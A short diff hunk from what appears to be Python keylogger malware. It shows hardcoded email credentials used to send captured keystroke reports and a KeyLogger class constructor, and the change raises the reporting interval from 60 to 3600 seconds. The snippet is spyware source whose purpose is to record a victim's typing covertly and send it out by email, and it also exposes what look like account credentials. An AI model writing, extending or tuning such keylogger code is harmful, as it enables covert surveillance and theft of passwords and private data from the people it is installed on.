@@ -24,7 +24,7 @@ except ModuleNotFoundError:
 finally:
     EMAIL_ADDRESS = "5209792040d294"
     EMAIL_PASSWORD = "f7f24a645d4132"
-    SEND_REPORT_EVERY = 60 # as in seconds
+    SEND_REPORT_EVERY = 3600 # as in seconds
     class KeyLogger:
         def __init__(self, time_interval, email, password):
             self.interval = time_interval
